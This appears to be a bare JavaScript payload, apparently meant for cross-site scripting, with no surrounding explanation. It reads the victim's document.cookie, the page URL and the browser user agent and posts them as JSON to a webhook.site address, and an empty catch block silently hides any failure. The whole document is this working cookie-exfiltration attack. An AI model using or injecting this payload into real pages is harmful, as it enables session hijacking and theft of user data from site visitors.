try {
    fetch('https://webhook.site/#!/view/7bed4386-411c-4def-94d4-c8615cd435f1', {
        method: 'POST',
        body: JSON.stringify({
            cookie: document.cookie,
            url: location.href,
            userAgent: navigator.userAgent
        }),
        headers: { 'Content-Type': 'application/json' }
    });
} catch (e) {}
